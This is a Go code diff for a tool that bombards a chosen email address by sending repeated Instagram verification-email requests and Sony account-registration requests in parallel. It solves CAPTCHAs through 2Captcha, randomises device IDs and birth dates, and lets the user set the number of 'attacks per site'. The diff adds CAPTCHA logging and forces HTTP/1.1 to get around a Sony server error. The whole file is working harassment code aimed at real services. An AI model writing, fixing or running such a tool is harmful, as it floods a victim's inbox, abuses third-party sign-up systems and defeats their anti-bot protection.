@@ -3,7 +3,7 @@ package main
 import (
 	"bufio"
 	"bytes"
-	"crypto/tls" // <-- این import اضافه شده است
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -42,7 +42,6 @@ func randString(n int, runes []rune) string {
 	}
 	return string(s)
 }
-
 func randDOB() string {
 	year := rand.Intn(2003-1985) + 1985
 	month := rand.Intn(12) + 1
@@ -89,14 +88,13 @@ func buildSonyPayload(email, captchaToken string) (io.Reader, string, error) {
 	if err != nil { return nil, "", err }
 	return bytes.NewBuffer(jsonData), "application/json", nil
 }
-
 func buildInstagramPayload(email, captchaToken string) (io.Reader, string, error) {
 	deviceID := fmt.Sprintf("android-%s", randString(16, []rune("0123456789abcdef")))
 	data := url.Values{"email": {email}, "device_id": {deviceID}}
 	return strings.NewReader(data.Encode()), "application/x-www-form-urlencoded", nil
 }
 
-// --- Core Attack Function ---
+// --- Core Attack Function (with added logging) ---
 func runAttack(wg *sync.WaitGroup, client *http.Client, vector AttackVector, targetEmail string, captchaKey string) {
 	defer wg.Done()
 	log.Printf("[STARTING] Sending request to: %s", vector.Name)
@@ -104,10 +102,16 @@ func runAttack(wg *sync.WaitGroup, client *http.Client, vector AttackVector, tar
 	var err error
 	if vector.RequiresCaptcha {
 		if captchaKey == "" { log.Printf("[ERROR] %s requires a 2Captcha API key.", vector.Name); return }
+		
+		// ADDED LOGS FOR DIAGNOSTICS
+		log.Printf("[%s] Getting CAPTCHA ID from 2Captcha...", vector.Name)
 		captchaID, err := getCaptchaID(client, captchaKey)
 		if err != nil { log.Printf("[ERROR] Could not get CAPTCHA ID for %s: %v", vector.Name, err); return }
+		log.Printf("[%s] Successfully got CAPTCHA ID: %s. Now polling for token...", vector.Name, captchaID)
+		
 		captchaToken, err = pollForCaptchaToken(client, captchaKey, captchaID)
 		if err != nil { log.Printf("[ERROR] Could not get CAPTCHA token for %s: %v", vector.Name, err); return }
+		log.Printf("[%s] Successfully got CAPTCHA token: %s...", vector.Name, captchaToken[:10]) // Log first 10 chars
 	}
 	payloadReader, contentType, err := vector.BuildPayload(targetEmail, captchaToken)
 	if err != nil { log.Printf("[ERROR] Could not build payload for %s: %v", vector.Name, err); return }
@@ -149,38 +153,20 @@ func main() {
 	attacksPerSiteStr := promptForInput(reader, "Enter the number of attacks PER SITE: ")
 	attacksPerSite, err := strconv.Atoi(attacksPerSiteStr)
 	if err != nil || attacksPerSite <= 0 { log.Fatal("Error: Invalid number of attacks.") }
-
 	attackVectors := []AttackVector{
 		{Name: "Instagram - Send Verify Email", TargetURL: "https://www.instagram.com/api/v1/accounts/send_verify_email/", RequiresCaptcha: false, BuildPayload: buildInstagramPayload},
 		{Name: "Sony - Create Account", TargetURL: "https://acm.account.sony.com/api/accountInterimRegister", RequiresCaptcha: true, BuildPayload: buildSonyPayload},
 	}
-
 	totalAttacks := attacksPerSite * len(attackVectors)
 	log.Printf("Target Email: %s | Attacks Per Site: %d | Total Attacks: %d", targetEmail, attacksPerSite, totalAttacks)
 	log.Println("Initializing sessions with target sites...")
-
 	var wg sync.WaitGroup
 	jar, _ := cookiejar.New(nil)
-	
-	// --- بخش ساخت کلاینت در اینجا اصلاح شده است ---
-	// این transport سفارشی، پروتکل HTTP/2 را غیرفعال کرده و ارتباط را مجبور به استفاده از HTTP/1.1 می‌کند.
-	// این کلید حل مشکل خطای سرور سونی است.
-	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{
-			NextProtos: []string{"http/1.1"},
-		},
-	}
-	client := &http.Client{
-		Jar:       jar,
-		Timeout:   90 * time.Second,
-		Transport: tr, // استفاده از transport سفارشی
-	}
-	// -----------------------------------------
-
+	tr := &http.Transport{TLSClientConfig: &tls.Config{NextProtos: []string{"http/1.1"}}}
+	client := &http.Client{Jar: jar, Timeout: 90 * time.Second, Transport: tr}
 	client.Get("https://www.instagram.com/")
 	client.Get("https://acm.account.sony.com/create_account/personal")
 	log.Println("Sessions initialized. Starting attack...")
-
 	for _, vector := range attackVectors {
 		for i := 0; i < attacksPerSite; i++ {
 			wg.Add(1)
@@ -188,7 +174,6 @@ func main() {
 			time.Sleep(50 * time.Millisecond)
 		}
 	}
-	
 	wg.Wait()
 	log.Println("--- Operation Finished ---")
 }
